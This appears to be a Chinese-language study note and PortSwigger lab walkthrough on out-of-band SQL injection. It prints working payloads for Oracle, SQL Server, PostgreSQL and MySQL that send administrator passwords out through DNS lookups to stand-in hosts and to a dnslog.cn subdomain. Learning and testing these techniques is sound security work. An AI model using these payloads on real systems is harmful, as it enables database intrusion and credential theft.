# 06 · OOB 带外注入（Out-of-Band）

> 当页面无差异、不能延时、连错误都看不到时的最后一条路：
> **让数据库主动向外发一个请求，把数据藏在域名里。**

---

## 一、什么是 OOB

前面几种盲注都需要"信号回到你这里"：

| 类型 | 信号 | 限制 |
|---|---|---|
| 条件响应 | 页面内容变化 | 页面必须有差异 |
| 条件错误 | HTTP 500 | 必须有错误回显 |
| 时间延迟 | 响应耗时 | 延迟函数可用、不被限速 |

**OOB 换了方向：不让信号回来，而是让数据库"打电话给你"。**

```
普通盲注：  你问 → 数据库答 → 你听
OOB：       你问 → 数据库把答案写进域名 → 去解析这个域名 → 你在自己的服务器上收到
```

```
┌──────┐  ① 注入   ┌────────┐  ② 发起查询   ┌──────────────┐
│  你  │ ────────→ │ 数据库 │ ───────────→ │ 你的域名服务器 │
└──────┘           └────────┘               └──────────────┘
                       │                          │
                  把密码拼进域名                   │
                  password.abc.dnslog.cn          │
                                                  ↓
                                          ③ 你看到这条 DNS 查询
```

**为什么常用 DNS 而不是 HTTP：**

- DNS 走 UDP 53，**几乎不会被防火墙拦**
- 无需建立连接，速度快
- **回显数据放在子域名里，长度够用**

---

## 二、什么时候用

```
✅ 页面完全无差异（真盲）
✅ 不能延时（过滤了 pg_sleep，或有执行时间限制）
✅ 需要一次性带出较多数据
✅ 数据库/应用能发起 DNS 或 HTTP 请求
```

**四类漏洞都通用：**

| 漏洞 | OOB 用法 |
|---|---|
| SQL 注入 | `xmltype` / `xp_dirtree` / `COPY TO PROGRAM` |
| XXE | 外部实体指向你的域名 |
| SSRF | 直接请求你的域名 |
| 命令注入 | `curl` / `nslookup` / `ping` 你的域名 |

---

## 三、四步验证流程（任何 OOB 题都这么走）

```
① 通道验证      域名能不能通？
                payload 里放固定域名 → 看到请求 → 通道可用

② 可控性验证    域名能不能带变量？
                把 'abc' 拼进域名 → 看到 abc.域名 → 可控

③ 数据提取      把查询结果拼进去
                (SELECT password FROM users ...) || '.你的域名'

④ 读取结果      在 OOB 平台上看到 Interactions
```

**这四步和盲注的「1=1 / 1=2」逻辑完全一样 —— 先证明通道，再传数据。**

---

## 四、DNS 查询 + 数据外带（官方速查）

> 以下内容译自 PortSwigger 的 SQL 注入速查表，**代码保持原样未改**。

### 4.1 原理说明

**DNS 查询与数据外带**

你可以让数据库向一个外部域名发起 DNS 查询，而这个域名中包含了注入查询的结果。要做到这一点，你需要使用 Burp Collaborator 生成一个唯一的 Burp Collaborator 子域名，在攻击中使用它，然后轮询 Collaborator 服务器，以获取任何 DNS 交互的详情，包括被外带出去的数据。

> **说明**：如果拿不到 Burp Collaborator，可以用 `dnslog.cn` 等平台替代（见第七节）。

### 4.2 四种数据库的 DNS 外带写法

**Oracle**

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

**Microsoft（SQL Server）**

```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

**PostgreSQL**

```sql
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

**MySQL**

> 以下手法仅在 Windows 上有效：

```sql
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

### 4.3 怎么用这张表

把 `YOUR-QUERY-HERE` 换成你的查询，把 `BURP-COLLABORATOR-SUBDOMAIN` 换成你的域名。

**注意每个数据库的差别：**

| 数据库 | 原理 | 需要特权吗 |
|---|---|---|
| **Oracle** | `xmltype` 解析 XML → 触发外部实体 → HTTP 请求 | **不需要** ✅ |
| **SQL Server** | `xp_dirtree` 访问 UNC 路径 → 触发 SMB 解析 | 通常可用 |
| **PostgreSQL** | `COPY TO PROGRAM` 调用 `nslookup` | **需要超级用户** |
| **MySQL** | `INTO OUTFILE` 写 UNC 路径 → 触发 DNS | **仅 Windows** |

---

## 五、Oracle：`xmltype` + XXE 详解（PortSwigger 那几关）

### 5.1 为什么能触发请求

**Oracle 解析 XML 时，如果 DTD 里引用了外部实体，它会去"取"那个 URL。**

```sql
EXTRACTVALUE(
  xmltype('<?xml version="1.0"?>
    <!DOCTYPE root [
      <!ENTITY % remote SYSTEM "http://这里会被访问/">
      %remote;
    ]>'),
  '/l')
```

| 部分 | 作用 |
|---|---|
| `xmltype('...')` | 解析 XML → 遇到外部实体 → **发起 HTTP 请求** |
| `EXTRACTVALUE(..., '/l')` | 让表达式有返回值（语法合法）；**真正干活的是 xmltype** |

**优势：这个手法不需要任何数据库特权**，普通用户就能用。

### 5.2 第 1 关：只验证通道

```sql
x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-DOMAIN/"> %remote;]>'),'/l') FROM dual--
```

**看到 DNS 记录 = 通道成立。**

### 5.3 第 2 关：把数据拼进域名

**唯一的差别：子在域名前拼上查询结果。**

```sql
x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-DOMAIN/">
    %remote;]>'),'/l') FROM dual--
```

**执行链：**

```
① Oracle 解析 XML → 遇到外部实体 → 要取 http://<密码>.YOUR-DOMAIN/
② 取之前先解析域名 → DNS 查询 <密码>.YOUR-DOMAIN
③ 平台记下这次查询
④ 你看到：s3cr3tP4ss1.YOUR-DOMAIN
                └────┬────┘
                  密码在这
```

### 5.4 编码规则（在 Cookie 里发）

| 字符 | 编码 | 原因 |
|---|---|---|
| `%` | **`%25`** | ⚠️ 最先处理，否则会二次编码 |
| 空格 | `+` | URL 编码 |
| `"` | `%22` | **Cookie 值里不允许双引号** |
| `;` | `%3B` | Cookie 分隔符 |
| `<` `>` | `%3C` `%3E` | 保险起见 |

**顺序很重要：先编码 `%`，再编码其他。**

---

## 六、其他 OOB 手法（补充）

### 6.1 Oracle 的其他函数

| 函数 | 用法 | 需要特权 |
|---|---|---|
| `UTL_HTTP.REQUEST('http://...')` | 直接发 HTTP | 通常需要 |
| `UTL_INADDR.GET_HOST_ADDRESS('x.域名')` | 只做 DNS | 有时需要 |
| **`xmltype` + `EXTRACTVALUE`** | **XXE 触发** | **不需要** ✅ |
| `DBMS_LDAP.INIT(('x.域名',80))` | 触发 DNS | 有时需要 |

### 6.2 MySQL 的替代

```sql
-- Windows 专用：UNC 路径触发 DNS
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.YOUR-DOMAIN\\a'))

-- 写文件到 UNC 共享
SELECT password FROM users LIMIT 1 INTO OUTFILE '\\\\YOUR-DOMAIN\\a'
```

### 6.3 SQL Server 的替代

```sql
-- xp_dirtree 触发 SMB 解析
EXEC master..xp_dirtree '\\YOUR-DOMAIN\a'

-- 带数据
declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE id=1);
exec('master..xp_dirtree "//'+@p+'.YOUR-DOMAIN/a"')

-- 也可以用 xp_cmdshell
EXEC xp_cmdshell 'nslookup 数据.YOUR-DOMAIN'
```

### 6.4 PostgreSQL 的替代

```sql
-- 需要超级用户
COPY (SELECT '') TO PROGRAM 'nslookup 数据.YOUR-DOMAIN'

-- dblink 扩展
SELECT dblink_connect('host=数据.YOUR-DOMAIN port=80 dbname=x');
```

---

## 七、平台选择（国内可用性）

> ⚠️ **先分清两个问题：**
> **① 平台本身能不能打开**（下表"国内可用"）
> **② 目标靶场让不让连这个平台**（见本节末尾 —— PortSwigger 的靶场只放行它自己的 Collaborator）

| 平台 | 能力 | 国内可用 | 说明 |
|---|---|---|---|
| **Burp Collaborator** | DNS + HTTP | ✅ | **仅 Pro 版**；社区版没有 |
| **dnslog.cn** | 仅 DNS | ✅ **实测可用** | 免费、免注册，最省事 |
| interactsh（app.interactsh.com） | DNS + HTTP | ❌ | 后端不可达，显示 Server Unavailable |
| ceye.io | DNS + HTTP | ❌ | 域名解析不了 |
| webhook.site | 仅 HTTP | ⚠️ | 适合 XXE/SSRF，不适合纯 DNS |
| 自建 VPS | DNS + HTTP | ✅ | `tcpdump -i any udp port 53`，最可控 |

### 用 dnslog.cn 的步骤

```
① 打开 http://www.dnslog.cn/
② 点「Get Subdomain」→ 得到如 wi1g3x.dnslog.cn
③ 把域名填进 payload
④ 发请求
⑤ 回页面点「Refresh Record」→ 看 DNS 记录
```

**看到的样子：**

```
时间          IP            域名
14:32:15    34.246.x.x    s3cr3tP4ss1.wi1g3x.dnslog.cn
                          └────┬────┘
                           外带的数据
```

### ⚠️ 关于 PortSwigger 的 OOB lab（重要，我原来理解错了）

**PortSwigger 的 lab 环境有防火墙，会阻断实验环境与「任意外部系统」的所有交互。**

> 官方原话：
> 「为防止学院平台被用于攻击第三方，我们的防火墙会阻止实验室与任意外部系统之间的交互。
> 要解决实验室问题，您必须使用 Burp Collaborator 的**默认公共服务器**。」

**这意味着：**

| 你以为的 | 实际情况 |
|---|---|
| ~~第三方平台能证明漏洞存在，只是 lab 不判 Solved~~ | ❌ **请求根本发不出去** |
| dnslog.cn 能收到记录 | ❌ 什么都没收到 |
| 换个域名继续练 | ❌ 只有 `*.burpcollaborator.net` 能通 |

**所以这条**不是**「判定问题」，是「通道问题」：**

```
lab 实例 → 防火墙 → 只放行 *.burpcollaborator.net
                    ✗ dnslog.cn
                    ✗ interactsh
                    ✗ 你的 VPS
```

**这个设计有两个目的：**

```
① 让 lab 能判定成功（它监控自己的 Collaborator 服务器）
② 防止有人拿 PortSwigger 的靶场去打第三方
```

### 那这道题到底怎么才能过

| 你的情况 | 能不能做 | 怎么做 |
|---|---|---|
| 有 Burp Pro | ✅ | 用默认公共 Collaborator 服务器 |
| 只有 Community | ❌ | **必须用 Pro 试用版**（30 天） |
| 想练手法 | ⚠️ | 需要自己搭环境（本地靶场不受这个限制） |

**关键结论：社区版无法完成任何 OOB 类 lab —— 不是手法问题，是工具缺口。**

**但手法本身是通用的：**
- 换成校赛/CTF 的靶场 → dnslog.cn 完全可用
- 换成 DVWA/本地搭的环境 → 自己的 VPS 完全可用
- **只有 PortSwigger 的靶场有这层防火墙**

---

## 八、限制与踩坑

### 8.1 DNS 的硬限制

| 限制 | 数值 | 影响 |
|---|---|---|
| **单个标签** | **≤ 63 字符** | 一次最多带 63 字节 |
| 完整域名 | ≤ 253 字符 | — |
| 允许字符 | `a-z 0-9 -` | 大写、`_`、`.`、`/` 都会出问题 |

### 8.2 长数据要分段 / 转码

```sql
-- Oracle 分段
(SELECT SUBSTR(password,1,30) FROM users WHERE username='administrator')

-- 转十六进制（避免非法字符）
Oracle : (SELECT RAWTOHEX(password) FROM users)
MySQL  : (SELECT HEX(password) FROM users)
MSSQL  : (SELECT CONVERT(VARCHAR(MAX), password, 2) FROM users)
```

### 8.3 常见坑

| 坑 | 现象 | 解决 |
|---|---|---|
| `%` 没编码 | payload 语法错，无请求 | **`%` → `%25`，且最先替换** |
| 双引号没编码 | Cookie 被截断 | `"` → `%22` |
| 域名替换不全 | 部分请求打到旧域名 | 整段搜索替换 |
| 记录不刷新 | 以为没成功 | dnslog.cn 手动点 Refresh，等几秒 |
| 表名大小写 | 第 2 关无请求 | Oracle 试 `USERS` |
| lab 过期 | 什么都没有 | 重新开 lab，更新 URL/TrackingId |
| **PortSwigger 靶场拦外连** | **用任何第三方域名都收不到** | **只能换 Pro 试用版 + 默认 Collaborator** |

---

## 九、完整实操记录（我的案例）

> ⚠️ **先说结果：这一关用 dnslog.cn 没成功。**
>
> 原因不是 payload 写错，而是 **PortSwigger 的防火墙只放行它自己的 Collaborator 服务器**（见第七节）。
>
> **payload 的构造方法是对的**，换个没有这层限制的靶场（校赛/本地）就能用。
> 这里完整记录下来，方便以后复用。

**目标：** PortSwigger「Blind SQL injection with out-of-band data exfiltration」（Oracle）

**尝试平台：** dnslog.cn，域名 `wi1g3x.dnslog.cn`

**结果：** 平台无任何记录 —— 请求被 lab 防火墙拦在出口。

**第 1 关通道验证 payload（URL 编码后）：**

```
x'+UNION+SELECT+EXTRACTVALUE(xmltype('%3C?xml+version=%221.0%22+encoding=%22UTF-8%22?%3E%3C!DOCTYPE+root+[+%3C!ENTITY+%25+remote+SYSTEM+%22http://wi1g3x.dnslog.cn/%22%3E+%25remote%3B]%3E'),'/l')+FROM+dual--
```

**第 2 关外带密码 payload（URL 编码后）：**

```
x'+UNION+SELECT+EXTRACTVALUE(xmltype('%3C?xml+version=%221.0%22+encoding=%22UTF-8%22?%3E%3C!DOCTYPE+root+[+%3C!ENTITY+%25+remote+SYSTEM+%22http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.wi1g3x.dnslog.cn/%22%3E+%25remote%3B]%3E'),'/l')+FROM+dual--
```

**解码后的 SQL：**

```sql
x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.wi1g3x.dnslog.cn/"> %remote;]>'),'/l') FROM dual--
```

**预期结果：** dnslog.cn 中出现 `密码.wi1g3x.dnslog.cn` 的 DNS 查询。

---

## 十、为什么要学 OOB

| 场景 | 没有 OOB 你会怎样 |
|---|---|
| 页面无差异、不能延时 | **完全无从下手** |
| 需要一次性拿整段数据 | 逐字符盲注要几百次请求 |
| 真实渗透遇到无回显 RCE | 只能猜 |

**OOB 是"最终手段"，也是最通用的手段 —— 一旦通了，数据就是"白送"的。**

---

## 十一、一句话总结

> **OOB = 让目标替你发一个 DNS/HTTP 请求，把数据藏在域名里。**
>
> **四步：通道 → 可控 → 带数据 → 读结果。**
>
> **Oracle 用 `xmltype` + XXE，不需要特权。**
>
> **DNS 单标签 ≤ 63 字符，数据要转成合法字符。**
>
> **国内用 dnslog.cn，要 Solved 用官方 Pro 试用。**
